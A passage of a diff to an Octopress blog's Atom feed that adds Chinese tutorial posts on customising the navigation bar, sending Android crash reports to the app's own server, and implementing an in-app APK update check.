@@ -4,7 +4,7 @@
   <title><![CDATA[K]]></title>
   <link href="http://mzkmzk.github.io/atom.xml" rel="self"/>
   <link href="http://mzkmzk.github.io/"/>
-  <updated>2015-05-03T20:17:45+08:00</updated>
+  <updated>2015-07-13T22:44:38+08:00</updated>
   <id>http://mzkmzk.github.io/</id>
   <author>
     <name><![CDATA[K]]></name>
@@ -12,6 +12,3294 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[修改octopress导航栏]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/07/13/update_slash/"/>
+    <updated>2015-07-13T21:28:46+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/07/13/update_slash</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>本人想做一个类似本博客中 导航栏的这个下拉选项效果</p>
+
+<h3>0x00 添加下拉框</h3>
+
+<p>导航栏页面 <code>/source/_include/header.html</code></p>
+
+<p> 在h1标签下添加下拉框</p>
+
+<pre><code>    &lt;nav id="K_select"&gt;
+    &lt;div class="alignleft menu"&gt;
+        &lt;a class="button"&gt;Category&lt;/a&gt;
+        &lt;div class="container"&gt;\{\% include navigation.html %\}\&lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class="alignright search"&gt;
+        &lt;a class="button"&gt;&lt;/a&gt;
+        &lt;div class="container"&gt;
+            &lt;form action="\{\{\ site.simple_search \}\}\" method="get"&gt;
+                &lt;input type="text" name="q" results="0"&gt;
+                &lt;input type="hidden" name="q" value="site:\{\{\ site.url | shorthand_url \}\}\"&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;/nav&gt;
+</code></pre>
+
+<h3>0x01 设置相关css</h3>
+
+<p>css<code>/source/styleshets/screen.css</code></p>
+
+<pre><code>#K_select
+ {
+display: block
+}
+
+#K_select a
+{
+display: block
+}
+
+#K_select .button
+{
+cursor: pointer
+}
+
+#K_select .container
+{
+display: none
+}
+
+#K_select .menu
+{
+position: relative;
+width: 150px;
+margin-left:175px;
+}
+
+#K_select .menu .button
+{
+background: #f2f2f2;
+border: 1px solid #ddd;
+color: #999;
+padding: 0 60px 0 10px;
+position: relative;
+-webkit-border-radius: 5px;
+-moz-border-radius: 5px;
+-ms-border-radius: 5px;
+-o-border-radius: 5px;
+border-radius: 5px
+}
+
+#K_select .menu .button:hover
+{
+color: #999
+}
+
+#K_select .menu .button.on
+{
+color: #666;
+-webkit-border-radius: 5px 5px 5px 0;
+-moz-border-radius: 5px 5px 5px 0;
+-ms-border-radius: 5px 5px 5px 0;
+-o-border-radius: 5px 5px 5px 0;
+border-radius: 5px 5px 5px 0
+}
+
+#K_select .menu .button.on:before
+{
+content: "\f077"
+}
+
+#K_select .menu .button:before
+{
+content: "\f078";
+color: #ddd;
+font: 16px FontAwesome;
+line-height: 30px;
+position: absolute;
+top: 0;
+right: 40px
+}
+
+#K_select .menu .container
+{
+background: #f2f2f2;
+border: 1px solid #ddd;
+border-top: none;
+position: absolute;
+top: 31px;
+z-index: 1;
+-webkit-border-radius: 0 0 5px 5px;
+-moz-border-radius: 0 0 5px 5px;
+-ms-border-radius: 0 0 5px 5px;
+-o-border-radius: 0 0 5px 5px;
+border-radius: 0 0 5px 5px
+}
+
+#K_select .menu .container ul
+{
+list-style: none
+}
+
+#K_select .menu .container ul ul
+{
+margin-left: 20px
+}
+
+#K_select .menu .container a
+{
+padding: 0 10px
+}
+
+#K_select .search
+{
+position: absolute;
+/*top: 0;
+right: 0*/
+}
+
+#K_select .search .button
+{
+background: #ddd;
+width: 30px;
+height: 30px;
+position: absolute;
+/*top: 1px;
+right: -1px;*/
+margin-top: 1px;
+margin-left: 315px;
+-webkit-border-radius: 0 5px 5px 0;
+-moz-border-radius: 0 5px 5px 0;
+-ms-border-radius: 0 5px 5px 0;
+-o-border-radius: 0 5px 5px 0;
+border-radius: 0 5px 5px 0
+}
+
+#K_select .search .button:before
+{
+content: "\f002";
+color: #f2f2f2;
+font: 20px FontAwesome;
+line-height: 30px;
+position: absolute;
+top: 0;
+left: 7px
+}
+
+#K_select .search .button.on
+{
+background: #ccc
+}
+
+#K_select .search .button.on:before
+{
+content: "\f00d"
+}
+
+#K_select .search .container
+{
+padding-left: 190px;
+/*position: absolute;
+right: 51px;*/
+z-index: 1
+}
+
+#K_select .search input[type="text"]
+{
+background: #fff;
+border: 1px solid #ddd;
+border-right: none;
+color: #999;
+font: 13px "HelveticaNeue-Light","Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,sans-serif;
+height: 30px;
+width: 100%;
+padding: 0 10px;
+-webkit-border-radius: 5px 0 0 5px;
+-moz-border-radius: 5px 0 0 5px;
+-ms-border-radius: 5px 0 0 5px;
+-o-border-radius: 5px 0 0 5px;
+border-radius: 5px 0 0 5px
+}
+
+#K_select .search input[type="text"]:focus,#K_select .search input[type="text"]:active
+{
+background: #fff;
+
+color: #666;
+outline: none
+}
+
+@media screen and (max-width: 600px)
+{
+#K_select
+{
+   display: none !important;
+}
+}
+
+@media screen and (min-width: 600px)
+{
+#header {
+    height: 30px !important;
+}
+#header h1
+{
+    float: left !important;
+}
+
+#main-nav {
+    float: left !important;
+    margin-left: 30px;
+    margin-top: 0px;
+}
+} 
+</code></pre>
+
+<h3>0x02 设置JS</h3>
+
+<p>文件 <code>/sourece/javascripts/slash.js</code>在function内添加以下代码</p>
+
+<pre><code>var k_select = $('#K_select');
+
+$('html').click(function(){
+    k_select.find('.on').each(function(){
+        $(this).removeClass('on').next().hide();
+    });
+});
+
+k_select.on('click', '.menu .button', function(){
+    if (!$(this).hasClass('on')){
+        var width = $(this).width() + 42;
+        $(this).addClass('on').next().show().css({width: width});
+    } else {
+        $(this).removeClass('on').next().hide();
+    }
+}).on('click', '.search .button', function(){
+    if (!$(this).hasClass('on')){
+        var width = 120;
+        k_select.children('.menu').children().eq(0).removeClass('on').next().hide();
+        $(this).addClass('on').next().show().css({width: width}).children().children().eq(0).focus();
+    } else {
+        $(this).removeClass('on').next().hide().children().children().eq(0).val('');
+    }
+}).click(function(e){
+    e.stopPropagation();
+});
+</code></pre>
+
+<h3>0x03 遍历分类目录</h3>
+
+<p><code>/source/_include/custom/navigation.html</code>ul标签内</p>
+
+<pre><code>    \{\% for category in site.categories \%\}
+&lt;li&gt;&lt;a href="\{\{ root_url \}\}/blog/categories/\{\{ category | first \}\}"&gt;\{\{ category | first \}\}&lt;/a&gt;&lt;/li&gt;
+\{\% endfor \%\}
+</code></pre>
+
+<h3>参考资料</h3>
+
+<p>遍历分类<a href="http://segmentfault.com/a/1190000000406017">http://segmentfault.com/a/1190000000406017</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[ps网上知识积累]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/07/02/ps.markdwon/"/>
+    <updated>2015-07-02T21:28:46+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/07/02/ps.markdwon</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>ps知识积累</h3>
+
+<p>消除背景<a href="http://jingyan.baidu.com/article/17bd8e52f64bc485ab2bb8c1.html">http://jingyan.baidu.com/article/17bd8e52f64bc485ab2bb8c1.html</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android 捕抓异常发送给服务器]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/06/25/android_exception/"/>
+    <updated>2015-06-25T21:28:46+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/06/25/android_exception</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>在任何服务性行业中,用户遇到的问题,我们就要解决
+所以app也要捕抓到用户在使用过程中的bug</p>
+
+<p>他们就是我们的测试人员</p>
+
+<p>本文中讲两部分,一部分是被我们捕抓到的异常,另一部分是我们没有捕抓到的,从而导致app奔溃的异常。</p>
+
+<p>异常最终都写入log.我把log放在可访问的地方,在浏览器输入地址即可查看</p>
+
+<p>效果如:</p>
+
+<pre><code>用户 ID: null it is UncaughtExceptionHandler
+2015-06-25-22:21class: com.tjrac.activity._0.LoginActivity$AndroidUser_Login; method: run; line: 141;  Exception: java.lang.NullPointerException
+2015-06-25-22:21class: java.lang.Thread; method: run; line: 1019;  Exception: java.lang.NullPointerException
+
+
+用户 ID: null it is UncaughtExceptionHandler
+2015-06-25-22:22class: com.tjrac.activity._0.LoginActivity$AndroidUser_Login; method: run; line: 141;  Exception: java.lang.NullPointerException
+2015-06-25-22:22class: java.lang.Thread; method: run; line: 1019;  Exception: java.lang.NullPointerException
+</code></pre>
+
+<h3>0x00 服务器接受异常数据</h3>
+
+<p>无论是我们捕抓或是没捕抓到的异常,服务器接受的方法都一样,写入一个.log文件中.我用的是Struts2框架</p>
+
+<pre><code>public class PrintException implements Action {
+
+@Override
+public String execute() throws Exception {
+    HttpServletRequest request =ServletActionContext.getRequest();
+    request.getContextPath();
+    File file =new File(ServletActionContext.getServletContext().getRealPath("/log")+"/Exception.log");
+    System.out.println(file.getPath());
+    PrintWriter pw =new PrintWriter(new OutputStreamWriter(new FileOutputStream(file,true),"UTF-8"),true);
+    pw.println("用户 ID: "+request.getParameter("cert_id"));
+    pw.println(request.getParameter("exception"));
+    pw.println();
+    pw.close();
+    return null;
+}
+</code></pre>
+
+<h3>0x01 发送被我们捕抓到的异常</h3>
+
+<p>这个就相对简单直接在捕抓异常后面加一个处理语句.题外话,可不可以重写捕抓异常的方法,然后捕抓异常后会自动发送异常给服务器.</p>
+
+<p>在捕抓到异常后调用sendException方法,我这里多给了一个Context,因为要获取到用户的id 然后方便处理异常.</p>
+
+<pre><code>public static void sendException(Context context,Exception exception){
+    List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
+    params.add(new BasicNameValuePair("cert_id", context
+            .getSharedPreferences("user", 0).getString("cert_id", null)));
+    params.add(new BasicNameValuePair("exception",ExceptionToString(exception)));
+    ModelServer modelHttp = new ModelServer();
+    modelHttp.Model_server(params, "PrintException");
+}
+
+/**
+ * 将Exception 转为String
+ * @param exception
+ * @return
+ */
+public static String ExceptionToString(Exception exception ){
+    StringWriter sw = new StringWriter();
+    PrintWriter pw =new PrintWriter(sw);
+    pw.println("异常发生时间 : "+getSystemTime_Minute());
+    exception.printStackTrace(pw);
+    pw.close();
+    return sw.toString();
+}
+</code></pre>
+
+<h3>0x02 设置捕抓全局异常</h3>
+
+<p>这里写了一个捕抓的Handler 通常不用大改,一般只改getTraceInfo()方法。</p>
+
+<pre><code>import java.io.File;
+import java.io.FileOutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
+import java.io.Writer;
+import java.lang.Thread.UncaughtExceptionHandler;
+import java.lang.reflect.Field;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Locale;
+import java.util.Map;
+import java.util.Map.Entry;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import org.apache.http.NameValuePair;
+import org.apache.http.message.BasicNameValuePair;
+
+import android.annotation.SuppressLint;
+import android.content.Context;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.content.pm.PackageManager.NameNotFoundException;
+import android.os.Build;
+import android.os.Environment;
+import android.os.Looper;
+import android.util.Log;
+import android.widget.Toast;
+
+/**
+ * UncaughtException处理类,当程序发生Uncaught异常的时候,有该类来接管程序,并记录发送错误报告.
+ * 
+ * @author user 
+ */
+@SuppressLint("SdCardPath")
+public class CrashHandler implements UncaughtExceptionHandler {
+
+public static final String TAG = "TEST";
+
+// CrashHandler 实例
+private static CrashHandler INSTANCE = new CrashHandler();
+
+// 程序的 Context 对象
+private Context mContext;
+
+// 系统默认的 UncaughtException 处理类
+private Thread.UncaughtExceptionHandler mDefaultHandler;
+
+// 用来存储设备信息和异常信息
+private Map&lt;String, String&gt; infos = new HashMap&lt;String, String&gt;();
+
+// 用来显示Toast中的信息
+private static String error = "程序错误，额，不对，我应该说，服务器正在维护中，请稍后再试";
+
+private static final Map&lt;String, String&gt; regexMap = new HashMap&lt;String, String&gt;();
+
+// 用于格式化日期,作为日志文件名的一部分
+private DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss",
+        Locale.CHINA);
+
+/** 保证只有一个 CrashHandler 实例 */
+private CrashHandler() {
+    //
+}
+
+/** 获取 CrashHandler 实例 ,单例模式 */
+public static CrashHandler getInstance() {
+    initMap();
+    return INSTANCE;
+}
+
+/**
+ * 初始化
+ * 
+ * @param context
+ */
+public void init(Context context) {
+    mContext = context;
+
+    // 获取系统默认的 UncaughtException 处理器
+    mDefaultHandler = Thread.getDefaultUncaughtExceptionHandler();
+
+    // 设置该 CrashHandler 为程序的默认处理器
+    Thread.setDefaultUncaughtExceptionHandler(this);
+    Log.d("TEST", "Crash:init");
+}
+
+/**
+ * 当 UncaughtException 发生时会转入该函数来处理
+ */
+@Override
+public void uncaughtException(Thread thread, Throwable ex) {
+    if (!handleException(ex) &amp;&amp; mDefaultHandler != null) {
+        // 如果用户没有处理则让系统默认的异常处理器来处理
+        mDefaultHandler.uncaughtException(thread, ex);
+        Log.d("TEST", "defalut");
+    } else {
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            Log.e(TAG, "error : ", e);
+        }
+        // 退出程序
+        android.os.Process.killProcess(android.os.Process.myPid());
+        // mDefaultHandler.uncaughtException(thread, ex);
+        System.exit(1);
+    }
+}
+
+/**
+ * 自定义错误处理，收集错误信息，发送错误报告等操作均在此完成
+ * 
+ * @param ex
+ * @return true：如果处理了该异常信息；否则返回 false
+ */
+private boolean handleException(Throwable ex) {
+    if (ex == null) {
+        return false;
+    }
+
+    // 收集设备参数信息
+    // collectDeviceInfo(mContext);
+    // 保存日志文件
+    saveCrashInfo2File(ex);
+    // 使用 Toast 来显示异常信息
+    new Thread() {
+        @Override
+        public void run() {
+            Looper.prepare();
+            Toast.makeText(mContext, error, Toast.LENGTH_LONG).show();
+            Looper.loop();
+        }
+    }.start();
+    return true;
+}
+
+/**
+ * 收集设备参数信息
+ * 
+ * @param ctx
+ */
+public void collectDeviceInfo(Context ctx) {
+    try {
+        PackageManager pm = ctx.getPackageManager();
+        PackageInfo pi = pm.getPackageInfo(ctx.getPackageName(),
+                PackageManager.GET_ACTIVITIES);
+
+        if (pi != null) {
+            String versionName = pi.versionName == null ? "null"
+                    : pi.versionName;
+            String versionCode = pi.versionCode + "";
+            infos.put("versionName", versionName);
+            infos.put("versionCode", versionCode);
+        }
+    } catch (NameNotFoundException e) {
+        Log.e(TAG, "an error occured when collect package info", e);
+    }
+
+    Field[] fields = Build.class.getDeclaredFields();
+    for (Field field : fields) {
+        try {
+            field.setAccessible(true);
+            infos.put(field.getName(), field.get(null).toString());
+            Log.d(TAG, field.getName() + " : " + field.get(null));
+        } catch (Exception e) {
+            Log.e(TAG, "an error occured when collect crash info", e);
+        }
+    }
+}
+
+/**
+ * 保存错误信息到文件中 *
+ * 
+ * @param ex
+ * @return 返回文件名称,便于将文件传送到服务器
+ */
+private String saveCrashInfo2File(Throwable ex) {
+    StringBuffer sb = getTraceInfo(ex);
+    Writer writer = new StringWriter();
+    PrintWriter printWriter = new PrintWriter(writer);
+    ex.printStackTrace(printWriter);
+    Throwable cause = ex.getCause();
+    while (cause != null) {
+        cause.printStackTrace(printWriter);
+        cause = cause.getCause();
+    }
+    printWriter.close();
+
+    String result = writer.toString();
+    sb.append(result);
+    try {
+        long timestamp = System.currentTimeMillis();
+        String time = formatter.format(new Date());
+        String fileName = "crash-" + time + "-" + timestamp + ".log";
+
+        if (Environment.getExternalStorageState().equals(
+                Environment.MEDIA_MOUNTED)) {
+            String path = Environment.getExternalStorageDirectory()
+                    + "/crash/";
+            File dir = new File(path);
+            if (!dir.exists()) {
+                dir.mkdirs();
+            }
+            FileOutputStream fos = new FileOutputStream(path + fileName);
+            fos.write(sb.toString().getBytes());
+            fos.close();
+        }
+
+        return fileName;
+    } catch (Exception e) {
+        Log.e(TAG, "an error occured while writing file...", e);
+    }
+
+    return null;
+}
+
+/**
+ * 整理异常信息
+ * @param e
+ * @return
+ */
+public static StringBuffer getTraceInfo(Throwable exception) {
+     /*
+    StringBuffer sb = new StringBuffer();
+
+    Throwable ex = e.getCause() == null ? e : e.getCause();
+    StackTraceElement[] stacks = ex.getStackTrace();
+    for (int i = 0; i &lt; stacks.length; i++) {
+        if (i == 0) {
+            setError(ex.toString());
+        }
+        sb.append(Utils.getSystemTime_Minute()).append("class: ").append(stacks[i].getClassName())
+                .append("; method: ").append(stacks[i].getMethodName())
+                .append("; line: ").append(stacks[i].getLineNumber())
+                .append(";  Exception: ").append(ex.toString() + "\n");
+    }
+
+    Log.d(TAG, sb.toString());
+    */
+    List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
+    params.add(new BasicNameValuePair("cert_id", "null it is UncaughtExceptionHandler"));
+    params.add(new BasicNameValuePair("exception",Utils.ThrowableToString(exception)));
+    ModelServer modelHttp = new ModelServer();
+    modelHttp.Model_server(params, "PrintException");
+    return new StringBuffer(Utils.ThrowableToString(exception));
+}
+
+/**
+ * 设置错误的提示语
+ * @param e
+ */
+public static void setError(String e) {
+    Pattern pattern;
+    Matcher matcher;
+    for (Entry&lt;String, String&gt; m : regexMap.entrySet()) {
+        Log.d(TAG, e+"key:" + m.getKey() + "; value:" + m.getValue());
+        pattern = Pattern.compile(m.getKey());
+        matcher = pattern.matcher(e);
+        if(matcher.matches()){
+            error = m.getValue();
+            break;
+        }
+    }
+}
+
+/**
+ * 初始化错误的提示语
+ */
+private static void initMap() {
+    // Java.lang.NullPointerException
+    // java.lang.ClassNotFoundException
+    // java.lang.ArithmeticException
+    // java.lang.ArrayIndexOutOfBoundsException
+    // java.lang.IllegalArgumentException
+    // java.lang.IllegalAccessException
+    // SecturityException
+    // NumberFormatException
+    // OutOfMemoryError 
+    // StackOverflowError 
+    // RuntimeException 
+    regexMap.put(".*NullPointerException.*", "嘿，无中生有~Boom!");
+    regexMap.put(".*ClassNotFoundException.*", "你确定你能找得到它？");
+    regexMap.put(".*ArithmeticException.*", "我猜你的数学是体育老师教的，对吧？");
+    regexMap.put(".*ArrayIndexOutOfBoundsException.*", "恩，无下限=无节操，请不要跟我搭话");
+    regexMap.put(".*IllegalArgumentException.*", "你的出生就是一场错误。");
+    regexMap.put(".*IllegalAccessException.*", "很遗憾，你的信用卡账号被冻结了，无权支付");
+    regexMap.put(".*SecturityException.*", "死神马上降临");
+    regexMap.put(".*NumberFormatException.*", "想要改变一下自己形象？去泰国吧，包你满意");
+    regexMap.put(".*OutOfMemoryError.*", "或许你该减减肥了");
+    regexMap.put(".*StackOverflowError.*", "啊，啊，憋不住了！");
+    regexMap.put(".*RuntimeException.*", "你的人生走错了方向，重来吧");
+
+}
+
+}
+</code></pre>
+
+<p>再写一个启动这个Handler的全局类</p>
+
+<pre><code>import android.app.Application;
+
+public class CrashApplication extends Application {
+
+@Override
+public void onCreate() {
+    super.onCreate();
+    CrashHandler crashHandler = CrashHandler.getInstance();
+    crashHandler.init(getApplicationContext());
+}
+
+}
+</code></pre>
+
+<p>然后在AndroidManifest.xml注册下这个全局类</p>
+
+<pre><code> &lt;application
+ android:name="com.tjrac.utils.CrashApplication"...&gt;
+</code></pre>
+
+<h3>参考资料</h3>
+
+<p>捕抓全局异常<a href="http://www.cnblogs.com/cpacm/p/3948991.html">http://www.cnblogs.com/cpacm/p/3948991.html</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android 版本升级实现]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/06/23/android_version/"/>
+    <updated>2015-06-23T21:28:46+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/06/23/android_version</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>项目中版本更新是不可或缺的功能</p>
+
+<p><img src="images/blog/2015-06-24-01.png" alt="展示图" /></p>
+
+<h3>0x00配置Config</h3>
+
+<p>这里主要配置的是4个final属性 还有的就是获取新版信息的路径,返回的是一个json 如</p>
+
+<p><code>{"version":{"apkname":"Tjrac_lib.apk","appname":"Tjrac_lib","verCode":"2","verName":"1.0.1"}}</code></p>
+
+<p>然后存放新版apk在UPDATE_APKNAME路径上~</p>
+
+<pre><code>import com.tjrac.R;
+
+import android.content.Context;
+import android.content.pm.PackageManager.NameNotFoundException;
+import android.util.Log;
+
+public class Config {
+private static final String TAG = "Config";
+/**
+ * 服务器存放的apk路径
+ */
+public static final String UPDATE_SERVER = "http://192.168.0.101:8080/NFC_Library/";
+
+/**
+ * 新版apk存在服务器的路径和名称
+ */
+public static final String UPDATE_APKNAME = "Tjrac_lib.apk";
+
+/**
+ * 获取版本信息的访问路径
+ */
+public static final String UPDATE_VERJSON = "LIB/LIB_AndroidUser_Version_Update";
+
+/**
+ * 保存在sdk内的新版apk名称
+ */
+public static final String UPDATE_SAVENAME = "Tjrac_lib.apk";
+
+public static int getVerCode(Context context) {
+    int verCode = -1;
+    try {
+        verCode = context.getPackageManager().getPackageInfo(
+                "com.tjrac", 0).versionCode;
+        System.out.println("版本号为 : "+verCode);
+    } catch (NameNotFoundException e) {
+        Log.e(TAG, e.getMessage());
+    }
+    return verCode;
+}
+
+public static String getVerName(Context context) {
+    String verName = "";
+    try {
+        verName = context.getPackageManager().getPackageInfo(
+                "com.tjrac", 0).versionName;
+        System.out.println("版本名称为 : "+verName);
+    } catch (NameNotFoundException e) {
+        Log.e(TAG, e.getMessage());
+    }
+    return verName;
+}
+
+public static String getAppName(Context context) {
+    String verName = context.getResources().getText(R.string.app_name)
+            .toString();
+    return verName;
+}
+}
+</code></pre>
+
+<h3>0x01 更新操作类 Update</h3>
+
+<p>getServerVerCode():获取新版本信息
+Select_Version():比较新旧版本号
+notNewVersionShow():版本号一致无需更新
+doNewVersionUpdate():更新版本
+downFile(final String url):下载新版本
+down():下载完成,取消提示框
+update():安装新版本</p>
+
+<pre><code>import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.json.JSONObject;
+
+import com.tjrac.R;
+import com.tjrac.activity.base.BaseActivity;
+
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.app.Dialog;
+import android.app.ProgressDialog;
+import android.content.Context;
+import android.content.DialogInterface;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
+
+public class Update  extends Activity{
+private static final String TAG = "Update";
+public ProgressDialog pBar;
+private Handler handler = new Handler();
+private Handler handler_Select_Version =new Handler();
+private int newVerCode = 0;
+private String newVerName = "";
+private Context context;
+
+public Update(Context context){
+    this.context=context;
+}
+
+public boolean getServerVerCode() {
+    new Thread() {
+        public void run() {
+            try {
+                String verjson = NetworkTool.getContent(Config.UPDATE_SERVER
+                        + Config.UPDATE_VERJSON);
+                System.out.println("getServerVerCode : " +Config.UPDATE_SERVER + Config.UPDATE_VERJSON);
+                System.out.println("获取新的版本号 json : " +verjson );
+                JSONObject json_msg = new JSONObject(verjson);
+                JSONObject obj = json_msg.getJSONObject("version");
+                    try {
+                        newVerCode = Integer.parseInt(obj.getString("verCode"));
+                        System.out.println("json 解析的新 版本 号 newVerCode为 : "+ newVerCode);
+                        newVerName = obj.getString("verName");
+                        System.out.println("json 解析的新 版本 名称 newVerName为 : "+ newVerName);
+                        Select_Version();
+                    } catch (Exception e) {
+                        newVerCode = -1;
+                        newVerName = "";
+                        e.printStackTrace();
+                    }
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }.start();
+
+    return true;
+}
+
+void Select_Version(){
+    handler_Select_Version.post(new Runnable() {
+        public void run() {
+            int vercode = Config.getVerCode(context);
+            System.out.println("获取新版本号后 为 新版本为 : "+ newVerCode +"  旧版本号为 : "+vercode);
+            if (newVerCode &gt; vercode) {
+                doNewVersionUpdate();
+            } else {
+                notNewVersionShow();
+            }
+        }
+    });
+}
+
+private void notNewVersionShow() {
+    int verCode = Config.getVerCode(context);
+    String verName = Config.getVerName(context);
+    StringBuffer sb = new StringBuffer();
+    sb.append("当前版本:");
+    sb.append(verName);
+    sb.append(" Code:");
+    sb.append(verCode);
+    sb.append(",\n已是最新版,⽆无需更新!");
+    Dialog dialog = new AlertDialog.Builder(context)
+            .setTitle("软件更新").setMessage(sb.toString())// 设置内容
+            .setPositiveButton("确定",// 设置确定按钮
+                    new DialogInterface.OnClickListener() {
+                        @Override
+                        public void onClick(DialogInterface dialog,
+                                int which) {
+                            finish();
+                        }
+                    }).create();// 创建 // 显⽰示对话框
+    dialog.show();
+}
+
+private void doNewVersionUpdate() {
+    int verCode = Config.getVerCode(context);
+    String verName = Config.getVerName(context);
+    StringBuffer sb = new StringBuffer();
+    sb.append("当前版本:");
+    sb.append(verName);
+    sb.append(" Code:");
+    sb.append(verCode);
+    sb.append(", 发现新版本:");
+    sb.append(newVerName);
+    sb.append(" Code:");
+    sb.append(newVerCode);
+    sb.append(", 是否更新?");
+    Dialog dialog = new AlertDialog.Builder(context)
+            .setTitle("软件更新")
+            .setMessage(sb.toString())
+            // 设置内容
+            .setPositiveButton("更新",// 设置确定按钮
+                    new DialogInterface.OnClickListener() {
+                        @Override
+                        public void onClick(DialogInterface dialog,
+                                int which) {
+                            pBar = new ProgressDialog(context);
+                            pBar.setTitle("正在下载");
+                            pBar.setMessage("请稍候...");
+                            pBar.setProgressStyle(ProgressDialog.STYLE_SPINNER);
+                            downFile(Config.UPDATE_SERVER
+                                    + Config.UPDATE_APKNAME);
+                            System.out.println("更新版本下载地址 : "+Config.UPDATE_SERVER+ Config.UPDATE_APKNAME );
+                        }
+                    })
+            .setNegativeButton("暂不更新",
+                    new DialogInterface.OnClickListener() {
+                        public void onClick(DialogInterface dialog,
+                                int whichButton) {
+                            // 点击"取消"按钮之后退出程序 finish();
+                        }
+                    }).create();// 创建
+    // 显⽰示对话框
+    dialog.show();
+}
+
+void downFile(final String url) {
+    pBar.show();
+    new Thread() {
+        public void run() {
+            HttpClient client = new DefaultHttpClient();
+            HttpGet get = new HttpGet(url);
+            HttpResponse response;
+            try {
+                response = client.execute(get);
+                HttpEntity entity = response.getEntity();
+                long length = entity.getContentLength();
+                InputStream is = entity.getContent();
+                FileOutputStream fileOutputStream = null;
+                if (is != null) {
+                    File file = new File(
+                            Environment.getExternalStorageDirectory(),
+                            Config.UPDATE_SAVENAME);
+                    fileOutputStream = new FileOutputStream(file);
+                    byte[] buf = new byte[1024];
+                    int ch = -1;
+                    int count = 0;
+                    while ((ch = is.read(buf)) != -1) {
+                        fileOutputStream.write(buf, 0, ch);
+                        count += ch;
+                        if (length &gt; 0) {
+                        }
+                    }
+                }
+                fileOutputStream.flush();
+                if (fileOutputStream != null) {
+                    fileOutputStream.close();
+                }
+                down();
+            } catch (ClientProtocolException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }.start();
+}
+
+void down() {
+    handler.post(new Runnable() {
+        public void run() {
+            pBar.cancel();
+            update();
+        }
+    });
+}
+
+void update() {
+    Intent intent = new Intent(Intent.ACTION_VIEW);
+    intent.setDataAndType(Uri.fromFile(new File(Environment
+            .getExternalStorageDirectory(), Config.UPDATE_SAVENAME)),
+            "application/vnd.android.package-archive");
+    context.startActivity(intent);
+}
+}
+</code></pre>
+
+<h3>网络辅助类 NetworkTool</h3>
+
+<pre><code>import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.params.HttpConnectionParams;
+import org.apache.http.params.HttpParams;
+
+public class NetworkTool {
+/**
+ * 获取⺴⽹网址内容
+ * 
+ * @param url
+ * @return
+ * @throws Exception
+ */
+public static String getContent(String url) throws Exception {
+    StringBuilder sb = new StringBuilder();
+    HttpClient client = new DefaultHttpClient();
+    HttpParams httpParams = client.getParams();
+    // 设置⺴⽹网络超时参数 HttpConnectionParams.setConnectionTimeout(httpParams,
+    // 3000);
+    HttpConnectionParams.setSoTimeout(httpParams, 5000);
+    HttpResponse response = client.execute(new HttpGet(url));
+    HttpEntity entity = response.getEntity();
+    if (entity != null) {
+        BufferedReader reader = new BufferedReader(new InputStreamReader(
+                entity.getContent(), "UTF-8"), 8192);
+        String line = null;
+        while ((line = reader.readLine()) != null) {
+            sb.append(line + "\n");
+        }
+        reader.close();
+    }
+    return sb.toString();
+}
+}
+</code></pre>
+
+<h3>调用更新方法</h3>
+
+<p>在当前的activity中</p>
+
+<pre><code>Update update =new Update(Sy_Activity.this);
+update.getServerVerCode();
+</code></pre>
+
+<h1>参考链接</h1>
+
+<p><a href="http://blog.csdn.net/xjanker2/article/details/6303937">http://blog.csdn.net/xjanker2/article/details/6303937</a></p>
+
+<p><a href="https://code.google.com/p/androidex/source/browse/trunk/jtapp-12-updateapksamples/">https://code.google.com/p/androidex/source/browse/trunk/jtapp-12-updateapksamples/</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android 欢迎界面的制作]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/06/22/android_welcome/"/>
+    <updated>2015-06-22T08:22:40+08:00</updated>
